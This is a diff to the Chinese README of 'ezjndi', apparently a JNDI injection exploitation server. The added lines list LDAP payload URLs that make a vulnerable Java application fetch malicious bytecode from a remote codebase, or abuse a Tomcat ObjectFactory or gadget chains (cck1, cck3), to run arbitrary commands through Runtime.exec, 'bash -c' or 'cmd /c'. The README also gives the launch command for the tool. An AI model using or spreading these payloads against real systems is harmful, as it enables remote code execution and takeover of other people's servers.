@@ -3,18 +3,14 @@
 
 LDAP Payload：
 ```text
-ldap://{IP}:{Port}/Foo --> 利用远程CodeBase加载恶意字节码执行命令
-ldap://{IP}:{Port}/Tom --> 使用Tomcat本地ObjectFactory执行命令
-ldap://{IP}:{Port}/RS/{gadget_name} --> LDAP服务直接返回序列化数据，并使用指定Gadget执行命令
+ldap://{IP}:{Port}/Sim --> 利用远程CodeBase加载恶意字节码执行命令，使用 Runtime.getRuntime().exec("{command}") 直接执行命令，Windows和Linux环境通用，执行复杂命令请将命令base64编码或使用下面的payload
+ldap://{IP}:{Port}/Foo --> 利用远程CodeBase加载恶意字节码执行命令，其方式为 "bash -c {command}"（Linux）或 "cmd /c {command}"（Windows），恶意字节码会自己判断系统类型并执行对应命令
+ldap://{IP}:{Port}/Tom --> 使用Tomcat本地ObjectFactory执行命令，目前只支持Linux环境
+ldap://{IP}:{Port}/RS/{gadget_name} --> LDAP服务直接返回序列化数据，并使用指定Gadget执行命令，目前只支持Linux环境
 
-可用Gadget：cck1 ｜ todo...
+可用Gadget：cck1 ｜ cck3 | todo...
 ```
 
-执行命令使用的方式如下（目前支持Linux环境），无需对命令进行base64编码：
-```java
-Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "{command}"});
-new ProcessBuilder(new String[]{"/bin/bash", "-c", "{command}").start();
-```
 
 LDAP默认端口1099，HTTP默认端口8080，可以使用命令行参数配置端口：
 ```text
@@ -31,9 +27,8 @@ java -jar ezjndi1.0.jar -lp={port1} -hp={port2} -c="{command}"
 ![img.png](img/img3.png)
 
 TODO:
-- 增加gadget
 - 支持动态执行命令，如`ldap://{IP}:{Port}/Foo/{command}`
-- Windows环境下利用cmd执行命令（`cmd /c {command}`）
+- 增加gadget
 ---
 ️备注：由于项目依赖使用了jdk自带的`rt.jar`，其默认不在JVM的 classpath 中，所以如果想修改源代码编译自己的版本，在编译前请修改`pom.xml`，将`<bootclasspath>`标签的值改为自己的`JAVA_HOMOE`：
 ```xml
